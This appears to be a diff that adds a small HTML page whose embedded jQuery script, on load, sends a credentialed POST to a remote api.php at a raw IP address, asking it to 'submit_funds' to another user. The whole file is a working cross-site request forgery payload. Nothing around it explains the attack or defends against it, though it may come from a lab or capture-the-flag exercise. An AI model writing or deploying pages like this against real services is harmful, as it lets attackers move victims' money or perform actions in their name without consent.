@@ -1,0 +1,17 @@
+<html>
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body>
+<script>
+  $.ajax({
+        type: 'POST',
+        url: 'http://18.158.46.251:25080/api.php',
+		xhrFields: {
+			withCredentials: true
+		},
+        data: JSON.stringify({"action":"submit_funds","r_user":"4","r_ammount":"2"})
+    });
+</script>
+</body>
+</html>
